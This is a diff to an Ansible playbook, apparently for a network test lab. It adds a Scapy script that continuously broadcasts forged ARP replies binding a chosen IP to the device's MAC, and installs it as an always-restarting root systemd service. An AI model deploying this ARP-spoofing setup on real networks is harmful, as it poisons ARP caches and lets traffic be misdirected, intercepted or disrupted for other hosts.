@@ -567,6 +567,72 @@
         msg: "DHCP server status: {{ dhcp_status.stdout }}"
 
 
+    - name: Create Python venv for scapy
+      command: python3 -m venv {{ scapy_venv_path }}
+      args:
+        creates: "{{ scapy_venv_path }}/bin/activate"
+      changed_when: false
+
+    - name: Install scapy in venv
+      command: "{{ scapy_venv_path }}/bin/pip install scapy"
+      changed_when: false
+
+    - name: Install netifaces in scapy venv
+      command: "{{ scapy_venv_path }}/bin/pip install netifaces"
+      changed_when: false
+
+    - name: Copy ARP spoof script (continuous, Scapy, wrong IP)
+      copy:
+        dest: /usr/local/bin/send_wrong_arp.py
+        mode: '0755'
+        content: |
+          from scapy.all import ARP, Ether, sendp
+          import time
+
+          iface = "{{ iface }}"
+          src_mac = "{{ device_mac }}"
+          wrong_ip = "{{ wrong_ip }}"
+          target_ip = "{{ target_ip }}"
+
+          while True:
+              arp = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(
+                  op=2,
+                  hwsrc=src_mac,
+                  psrc=wrong_ip,
+                  hwdst="ff:ff:ff:ff:ff:ff",
+                  pdst=target_ip
+              )
+              sendp(arp, iface=iface, count=1, verbose=False)
+              print(f"Sent ARP reply: {wrong_ip} is-at {src_mac} to {target_ip}")
+              time.sleep(1)
+
+    - name: Create systemd unit for continuous ARP spoof
+      copy:
+        dest: /etc/systemd/system/send-wrong-arp.service
+        mode: '0644'
+        content: |
+          [Unit]
+          Description=Continuous ARP Spoof Sender
+          After=network.target
+
+          [Service]
+          Type=simple
+          ExecStart={{ scapy_venv_path }}/bin/python /usr/local/bin/send_wrong_arp.py
+          Restart=always
+          User=root
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Reload systemd daemon
+      systemd:
+        daemon_reload: yes
+
+    - name: Enable and start continuous ARP spoof service
+      systemd:
+        name: send-wrong-arp
+        enabled: yes
+        state: started
 
     # BLOCK ICMP 
 
